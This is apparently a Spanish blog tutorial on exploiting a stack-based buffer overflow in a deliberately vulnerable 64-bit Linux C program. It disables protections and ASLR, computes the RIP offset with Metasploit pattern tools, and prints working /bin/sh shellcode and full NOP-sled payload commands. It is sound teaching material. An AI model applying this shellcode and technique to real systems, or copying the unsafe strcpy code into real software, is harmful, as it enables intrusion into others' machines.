---
title: Buffer Overflow stack based
author: c4rta
date: 2022-07-28
categories: [Explotacion binaria]
tags: [bof stack based]
---

Aprenderas a como realizar un simple buffer overflow stack-based en linux de 64 bits, ademas de inyectar una shellcode para /bin/sh

## ¿Que es buffer overflow?

El buffer es un espacio en la memoria en el cual se almacenan datos de manera temporal mientras se transfieren de una ubicacion a otra. El buffer overflow ocurre cuando se supera el espacio que se le fue asignado al buffer, como resultado de esto el programa intenta escribir los datos en el buffer pero lo unico que ocasiona es que se sobreescriban otros registros de la memoria

![](/assets/img/commons/bof-stack-based/buffer-overflow.png.webp)

En la imagen se puede observar una parte coloreada de azul en la cual se refiere al buffer de 8 bytes donde cada caracter de la palabra "password" es un byte, por otra parte se tiene una parte coloreada de color salmon/naranja en la cual tiene 2 caracteres (2 bytes) mas de los que puede almacenar el buffer, en la imagen esa parte tiene como nombre "overflow" ya que cuando se le ingresan esos 2 bytes de mas ya se estan saliendo de lo que puede almacenar el buffer y lo que ocurre es un buffer overflow

Imagen: [https://www.imperva.com/](https://www.imperva.com/)

## Layout del stack

El layout del stack en un buffer overflow se estructura de la siguiente manera
```
   high memory
|---------------|
|    funcion    |
|---------------|
|   parametros  |
|---------------|
|      RET      | --> Return adress/RIP: contiene la direccion de la siguiente instruccion a ejecutar
|---------------|
|      RBP      | --> Base pointer: Puntero base del stack frame actual
|---------------|     
|     buffer    |
|---------------|
|               |
|---------------|
    low memory

RSP: Stack pointer, apunta a la parte superior del stack, RSP contiene la direccion del ultimo valor 
que se metio en el stack
```

### A tomar en cuenta
Seguramente habras encontrado que los registros como el RBP y RSP pueden tener el nombre de EBP Y ESP, esto es por la arquitectura del sistema, a continuacion te muestro una tabla con los respectivos nombres de los registros en 32 y 64 bits

| 32 bits | 64 bits |
| --- | ----------- |
| EAX | RAX |
| EBX | RBX |
| ECX | RCX |
| EDX | RDX |
| ESP | RSP |
| EBP | RBP |
| EIP | RIP |

## Analisis el codigo fuente del binario

```c
#include<stdio.h>
#include<string.h>
int main(int argc, char *argv[]){
  char buf[100];
  strcpy(buf,argv[1]);
  printf("Input: %s\n",buf);
  return 0;
}
```
En el siguiente codigo tenemos un buffer de 100 que se esta declarando como ```char buf[100] ``` , ademas se esta usando la funcion ```strcpy``` la cual copia el contenido de una cadena a otra, en este caso copia lo que se escriba como argumento a ```buf``` , posteriormente con ```printf``` se imprime el contenido de ```buf``` que seria lo que hayamos ingresado como argumento.

Antes de ejecutar el binario se debe de compilar de la siguiente manera esto para desactivar las protecciones y podamos ejecutar una shellcode:

```bash
gcc -fno-stack-protector -z execstack vuln.c -o vuln
```
Ahora podemos ver la ejecucion del binario de la siguiente manera:

![](/assets/img/commons/bof-stack-based/codigo.png)

Como se puede ver lo que se ingresa como argumento es lo que se imprime.

## Desbordando el buffer

Antes de comenzar con esta parte tenemos que desactivar la aleatoriedad de las direcciones (ASLR) con el siguiente comando:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Si quieres volver a activarlo solo cambia el 0 por un 2.

Ahora si pasaremos a ocasionar el buffer overflow, como sabemos que se esta declarando un buffer de 100, simplemente con unos caracteres de mas lograremos el buffer overflow, para esto usare python y con el siguiente comando generare 150 A.

```python
python -c "print ('A' * 150)"
```
Ahora estos 150 caracteres son los que le pasaremos como argumento a nuestro binario.

![](/assets/img/commons/bof-stack-based/desborde.png)

Y peto, vemos que nos arrojo un ```segmentation fault (core dumped)```, esto ocurre por que por dentro del binario se esta intentanto acceder a una direccion de la memoria que no es valida, entonces el flujo del programa se corrompe y no tiene mas opcion que petar.

Ahora pasaremos a ver que esta pasando por detras del binario y por que peta, para esto usare gdb con pwndbg, te dejo el repo de pwndbg en el cual vienen los pasos de la instalacion

```
https://github.com/pwndbg/pwndbg.git
```
Para comenzar a debuggear el programa con gdb ingresamos este comando 

```
gdb -q ./vuln
```

Para poder ver lo que esta pasando por detras y ver por que nos arrojo el ```segmentation fault (core dumped)``` primero tenemos que ejecutar el binario desde gdb pasandole 150 A con el siguiente comando:

```
r $(python2 -c "print 'A'*150")
```
Al ejecutarlo pasandole 150 A vemos que nos arroja esto:

![](/assets/img/commons/bof-stack-based/gdb-overflow.png)

Aqui podemos notar algo diferente a demas del ```segmentation fault```, abajo de eso vemos el siguiente mansaje ```0x0000555555555193 in main ()```, esto nos quiere decir que en esa direccion del main() hay algo que es invalido

Bajando un poquito mas de lo que nos muestra el gdb vemos lo siguiente: 

![](/assets/img/commons/bof-stack-based/ret.png)

* El RBP se ha sobreescrito por nuestra A
* El RSP que apunta a la parte superior del stack contiene una direccion con puras A
* Y el RET/RIP el cual apunta a la siguiente direccion a ejecutar tiene la direccion ```0x4141414141414141``` que en decimal es AAAAAAAA

Y si mostramos el stack frame con el comando ```i f``` , vemos que nuestro ```saved rip``` vale ```0x4141414141414141``` 

```
rip = 0x555555555193 in main; saved rip = 0x4141414141414141
```

### ¿Entonces por que peta?

El programa peta por que cuando se sobreescribe el RIP/RET por ```0x4141414141414141``` , ahora esta apuntando a esa direccion y esa direccion no es valida por que no hay nada que el programa pueda hacer, es por eso que el flujo del programa se corrompe y peta

Y el layout quedo de la siguiente manera

```
  Ʌ     high memory
  |  |---------------|
  |  |    funcion    |
  |  |---------------|
  |  |   parametros  |
  |  |---------------|
  |--| 414141414141  | --> RIP/RET: 0x4141414141414141
  |  |---------------|
  |--| 414141414141  | --> RBP: 0x4141414141414141
  |  |---------------|     
  |--| 414141414141  | --> Este es el buffer que se lleno de puras A
     |---------------|
     |               |
     |---------------|
        low memory

Cuando se sobrepasa el tamaño del buffer nuestras A empiezan a subir a otros registros del stack 
y a su vez los van sobreescribiendo
```

## Calculando el offset del RIP

Ahora que ya sabemos que podemos sobreescribir el RIP lo que tenemos que hacer ahora es encontrar el offset del RIP, ya que esto no dice desde donde se empieza a sobreescribir, en x64 podemos hacer uso del offset del RSP para sacar el desplazamiento para llegar hasta el RIP.

Para esto usaremos una utilidad de metasploit que se llama ```pattern_create``` que nos permite generar una serie de caracteres para poder calcular los offset, el comando queda de la siguiente manera:

```/opt/metasploit/tools/exploit/pattern_create.rb -l 150```

En mi caso lo ejecuto asi por que en esa ubicacion tengo la utilidad (se que pwndbg tiene un comando llamado ```cyclic``` para hacer lo mismo, solo que cuando lo uso me peta el pwndbg XD).

Ahora tenemos que correr el programa de esta forma con toda esta cadena que nos genero

```
r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```

Si vemos nuestro RSP ahora tiene el valor de ```0x6541316541306541```, esto son unos caracteres que se tomaron de la cadena que se genero.

Ahora con otra utilidad de metasploit llamada ```pattern_offset``` encontraremos el offset del RSP y el comando queda de la siguiente manera

```
/opt/metasploit/tools/exploit/pattern_offset.rb -q 0x6541316541306541
```

Ahi lo tenemos, ahora ya sabemos el offset del RIP con ayuda del RSP
```
[*] Exact match at offset 120
```

## Ejecutando la shellcode

### ¿Que es una shellcode? 

Una shellcode son instrucciones de bajo nivel que son programadas en lenguaje ensamblador las cuales se inyectan en la memoria, estas intrucciones para poder ser inyectadas se deben de pasar a un string de bytes, la shellcode que usaremos es de 24 bytes y es esta

```
\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
```
Lo que hara es ejecutar /bin/sh, aqui les dejo el codigo en asm de esta misma shellcode

```
section .text
  global _start
    _start:
      push rax
      xor rdx, rdx
      xor rsi, rsi
      mov rbx,'/bin//sh'
      push rbx
      push rsp
      pop rdi
      mov al, 59
      syscall
```

Tambien para poder usar una shellcode correctamente tenemos que hacer uso de los NOPs o NOP-slides

Lo que nos permiten los NOPs es deslizar el programa hacia un destino, se interpretan con el valor ```\x90```

### Ubicando nuestra shellcode en la memoria

El primer paso que haremos es ubicar nuestra shellcode en la memoria y lo haremos de la siguiente forma

Hay que recordar que tenemos un buffer de 100 que se esta declarando asi ```char buf[100]```

En estos 100 bytes tenemos que lograr ubicar nuestra shellcode de 24 bytes, asi que para eso restaremos 100 - 24 bytes de la shellcode y nos da 76, este 76 sera el junk que llenaremos de NOPs para llenar el buffer de ```100```, los otros 24 bytes restantes son de la shellcode, hasta ahora nuestro payload va asi:

```
 76 bytes + 24 bytes = 100 bytes
|---------|-----------|
|  junk   | shellcode |
|---------|-----------|
```

Tambien le sumaremos 20 NOPs que corresponden al padding, si hacemos una suma de lo que llevamos hasta ahora nos da 120 y nuestro payload va asi:

```
 76 bytes +  24 bytes + 20 bytes = 120 bytes
|---------|-----------|---------|
|  junk   | shellcode | padding |
|---------|-----------|---------|

```
Por ultimo le pasaremos 8 bytes mas para sobreescribir el RIP y el payload queda asi:

```
 76 bytes +  24 bytes + 20 bytes + 8 bytes = 128 bytes
|---------|-----------|----------|--------|
|  junk   | shellcode | padding  |  RIP   |
|---------|-----------|----------|--------|

```

Pasemos a ejecutar el binario en pwndbg de la siguiente manera:

```
r $(python2 -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'\x90'*20+'B'*8")
```
Vemos la misma historia, se ocasiono el ```segmentation fault``` y nuestro RIP vale ```0x4242424242424242``` que son las 8 B que le indicamos.

Para ver si nuestra shellcode esta en la memoria mostraremos 100 bytes del rsp menos 200 con el siguiente comando en gdb:

```x/100wx $rsp-200```

Esto nos debe de mostar algo como esto, donde la parte que esta seleccionada es nuestra shellcode, tambien ahi mismo podemos ver los 76 NOPs del junk, los 20 del padding y los 8 del RIP

![](/assets/img/commons/bof-stack-based/shellcode.png)


Por ultimo para poder ejecutar nuestra shellcode tenemos que cambiar esos 8 bytes del RIP a una direccion que este entre todos los NOPs y donde solo haya NOPs, esa direccion la tenemos que pasar a little endian, yo les recomiendo que usen cualquiera de estas, yo use la que esta seleccionada (es probable que las direcciones que les salgan a ustedes sean diferentes a las mias): 

![](/assets/img/commons/bof-stack-based/ret-shellcode.png)


El comando para ejecutar en gdb queda de la siguiente forma:

```
r $(python2 -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'\x90'*20+'\xe0\xdc\xff\xff\xff\x7f\x00\x00'")
```

Y listo, ya obtuvimos una shell!!

![](/assets/img/commons/bof-stack-based/pwn.png)

Eso ha sido todo, gracias por leer ❤


![](/assets/img/commons/bof-stack-based/waifu.png)